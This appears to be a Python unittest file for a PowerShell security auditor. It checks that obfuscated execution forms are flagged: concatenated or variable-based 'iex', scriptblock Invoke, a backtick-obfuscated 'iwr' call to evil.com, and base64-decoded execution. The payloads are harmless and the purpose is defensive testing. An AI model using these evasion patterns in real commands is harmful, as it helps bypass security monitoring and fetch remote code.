import unittest
import base64
from security.auditor import PowerShellAuditor

class TestPowerShellAdversarial(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.auditor = PowerShellAuditor()

    @classmethod
    def tearDownClass(cls):
        cls.auditor.cleanup()

    def assert_blocked(self, command, reason_substring=None):
        ast = self.auditor.parse(command)
        self.assertTrue(len(ast.findings) > 0, f"Command should have been blocked: {command}")
        if reason_substring:
            self.assertTrue(any(reason_substring in f for f in ast.findings), 
                            f"Expected reason '{reason_substring}' in findings: {ast.findings}")

    def test_basic_iex(self):
        self.assert_blocked("iex 'echo hello'", "Risky command detected: iex")

    def test_concatenated_iex(self):
        # &('i'+'ex')
        # In our current implementation, GetCommandName() might return null for this, 
        # which triggers "Indirect invocation detected"
        self.assert_blocked("&('i'+'ex') 'echo hello'", "Indirect invocation")

    def test_variable_iex(self):
        # $a='iex'; &$a '...'
        self.assert_blocked("$a='iex'; &$a 'echo hello'", "Indirect invocation")

    def test_scriptblock_invoke(self):
        # [scriptblock]::Create("...").Invoke()
        self.assert_blocked('[scriptblock]::Create("Get-Date").Invoke()', "Dynamic .Invoke() member call detected")

    def test_obfuscated_iwr(self):
        # i`wr
        # `w is not a special escape sequence, so it remains 'w'
        self.assert_blocked("i`wr http://evil.com", "Risky command detected")

    def test_large_base64_blob(self):
        payload = base64.b64encode(b"Write-Output 'Evil'").decode()
        # Make it long enough to trigger the 500 char limit
        long_payload = payload * (501 // len(payload) + 1)
        self.assert_blocked(f"'{long_payload}'", "Suspicious large base64-like string")

    def test_encoded_command_simulation(self):
        # $c = '...'; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c)))
        # This uses iex (blocked) and potentially .Invoke (if they use it)
        # Here we just test if iex catches it.
        self.assert_blocked("iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZWNobyBoZWxsbw==')))", "Risky command detected: iex")

if __name__ == '__main__':
    unittest.main()
